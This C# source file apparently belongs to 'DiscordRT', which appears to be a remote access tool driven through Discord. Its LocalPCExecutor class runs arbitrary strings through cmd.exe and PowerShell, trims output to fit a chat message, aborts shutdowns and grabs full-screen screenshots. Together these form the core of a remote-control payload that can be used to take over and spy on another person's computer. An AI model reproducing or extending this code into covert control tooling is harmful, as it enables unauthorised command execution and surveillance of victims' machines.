using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DiscordRT.Modules
{
    public class LocalPCExecutor
    {
        public static string ExecuteCommandPrompt(string command)
        {
            Process commandw = new Process();
            commandw.StartInfo.FileName = "cmd.exe";
            commandw.StartInfo.Arguments = $"/C {command}";
            commandw.StartInfo.UseShellExecute = false;
            commandw.StartInfo.RedirectStandardOutput = true;
            commandw.StartInfo.RedirectStandardInput = true;
            commandw.Start();

            string output_data = commandw.StandardOutput.ReadToEnd();
            commandw.WaitForExit(5000);

            if (output_data != null && output_data.Length < 1900 && commandw.ExitCode == 0)
            {
                return "OK" + output_data;
            }
            if (commandw.ExitCode != 0)
            {
                return "ERROR";
            }
            else if (output_data == null)
            {
                return "BLANK";
            }
            else if (output_data.Length > 1900)
            {
                return "ERR_TOO_LNG" + output_data;
            }
            else
            {
                return "??NO_OUT";
            }
        }


        public static string ExecutePowerShell(string command)
        {
            Process commandw = new Process();
            commandw.StartInfo.FileName = "powershell.exe";
            commandw.StartInfo.Arguments = $"-c {command}";
            commandw.StartInfo.UseShellExecute = false;
            commandw.StartInfo.RedirectStandardOutput = true;
            commandw.StartInfo.RedirectStandardInput = true;
            commandw.Start();

            string output_data = commandw.StandardOutput.ReadToEnd();
            commandw.WaitForExit(5000);

            if (output_data != null && output_data.Length < 1900 && commandw.ExitCode == 0)
            {
                return "OK" + output_data;
            }
            if (commandw.ExitCode != 0)
            {
                return "ERROR";
            }
            else if (output_data == null)
            {
                return "BLANK";
            }
            else if (output_data.Length > 1900)
            {
                return "ERR_TOO_LNG" + output_data;
            }
            else
            {
                return "??NO_OUT";
            }
        }


        public static bool AbortShutDown()
        {
            Process commandw = new Process();
            commandw.StartInfo.FileName = "cmd.exe";
            commandw.StartInfo.Arguments = $"/C shutdown -a";
            commandw.StartInfo.UseShellExecute = false;
            commandw.StartInfo.RedirectStandardOutput = true;
            commandw.StartInfo.RedirectStandardInput = true;
            commandw.Start();

            string output_data = commandw.StandardOutput.ReadToEnd();
            commandw.WaitForExit(5000);

            if (commandw.ExitCode != 0)
                return false;
            else
                return true;
        }

 
        public static async Task<Bitmap> TakeScreenshot()
        {
            Bitmap img = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(img);
            g.CopyFromScreen(0, 0, 0, 0, img.Size);
            return img;
        }


    }
}
